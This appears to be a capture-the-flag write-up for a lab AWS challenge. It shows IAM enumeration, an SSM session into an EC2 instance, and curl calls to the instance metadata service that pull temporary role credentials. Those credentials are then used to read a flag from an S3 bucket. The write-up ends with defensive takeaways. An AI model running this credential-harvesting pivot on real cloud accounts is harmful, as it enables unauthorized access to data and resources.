# Cloudfoxable - Bastion 100

## Challenge Statement

In this challenge, we were provided with a bastion host setup in AWS that acted as a gateway to other resources. The goal was to leverage AWS IAM enumeration techniques to gain access to an EC2 instance via AWS Systems Manager (SSM) and retrieve a flag stored in an S3 bucket. This challenge tested knowledge of AWS IAM roles, instance profiles, SSM session management, and S3 permissions.

## Analysis

The challenge setup included a user profile `ctf-starting-user` configured in `~/.aws/credentials` under the profile `cloudfoxable`. The first step was to enumerate IAM policies attached to this user to understand the permissions available.

### **Enumerating IAM Policies**

We checked the managed policies attached to the user:

```bash
aws iam list-attached-user-policies --user-name ctf-starting-user --profile cloudfoxable
```

One of the attached policies was `SecurityAudit`, which provides read access to various AWS services, including IAM. This allowed further enumeration of permissions:

```bash
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/SecurityAudit --profile cloudfoxable
```

Fetching the policy document revealed permissions for `Get*`, `Describe*`, and `List*` actions across multiple AWS services, confirming that the user had sufficient rights to inspect IAM roles and policies.

### **Identifying EC2 Access via SSM**

Another policy, `bastion-ssm`, caught our attention:

```bash
aws iam get-policy --policy-arn arn:aws:iam::425670648728:policy/bastion-ssm --profile cloudfoxable
```

Examining the policy document confirmed that the user could start an SSM session on a specific EC2 instance (`i-09a523312d972cb80`).

```bash
aws ssm start-session --target i-09a523312d972cb80 --profile cloudfoxable
```

Upon successfully connecting to the instance, we shifted focus to discovering IAM roles associated with it.

### **Enumerating Instance Profile and Associated Role**

We used the EC2 instance metadata service to determine the IAM instance profile:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
```

Alternatively, using AWS CLI:

```bash
aws ec2 describe-instances --instance-ids i-09a523312d972cb80 --query "Reservations[].Instances[].IamInstanceProfile" --profile cloudfoxable
```

The instance profile was named `bastion`, and the associated IAM role was `reyna`.

```bash
aws iam get-instance-profile --instance-profile-name bastion --query 'InstanceProfile.Roles[0].[RoleName, Arn]' --profile cloudfoxable
```

### **Checking Role Permissions**

To determine what the `reyna` role could access, we listed its attached policies:

```bash
aws iam list-attached-role-policies --role-name reyna --profile cloudfoxable
```

A policy named `bastion-s3` stood out. Investigating further:

```bash
aws iam get-policy --policy-arn arn:aws:iam::425670648728:policy/bastion-s3 --profile cloudfoxable
```

The policy allowed listing and retrieving objects from the S3 bucket `cloudfoxable-bastion-v1ubc`.

## Solution

### **Retrieving Temporary AWS Credentials**

Since the EC2 instance had the `reyna` role, we could retrieve temporary credentials from the metadata service:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/reyna
```

Using these credentials, we created a local AWS profile:

```ini
[profile bastion]
aws_access_key_id = <ACCESS_KEY>
aws_secret_access_key = <SECRET_KEY>
aws_session_token = <SESSION_TOKEN>
```

### **Accessing the S3 Bucket and Retrieving the Flag**

With the `bastion` profile set up, we listed the S3 bucket contents:

```bash
aws s3 ls s3://cloudfoxable-bastion-v1ubc --profile bastion
```

Finding the flag file, we downloaded it:

```bash
aws s3 cp s3://cloudfoxable-bastion-v1ubc/flag.txt $PWD --profile bastion
```

This revealed the flag:

```
FLAG:bastion::ifYouHaveAccessToAnEC2YouHaveAccessToItsIamPermissions
```

## Reflection

### **Approach Taken**

- Enumerated IAM policies and permissions.
- Identified SSM access to the EC2 instance.
- Retrieved the instance profile and IAM role.
- Leveraged the role’s permissions to access S3 and obtain the flag.

### **Challenges Faced**

- Understanding IAM policy structures and their implications.
- Identifying the correct approach to leverage EC2 role permissions.
- Handling temporary credentials and configuring a local profile.

### **Security Takeaways**

- **EC2 IAM roles should follow the principle of least privilege.** If an EC2 instance has excessive permissions, an attacker gaining access to the instance could escalate privileges.
- **Restrict metadata service access.** Using `IMDSv2` prevents attackers from easily retrieving instance role credentials.
- **Monitor AWS CloudTrail logs.** Unauthorized access attempts or excessive role assumption activity should raise alerts.
- **Use S3 bucket policies carefully.** Allowing broad access to an IAM role attached to an EC2 instance can lead to privilege escalation.

This challenge demonstrated how attackers can pivot from an IAM user to an EC2 instance and escalate privileges using AWS IAM misconfigurations. 🚀
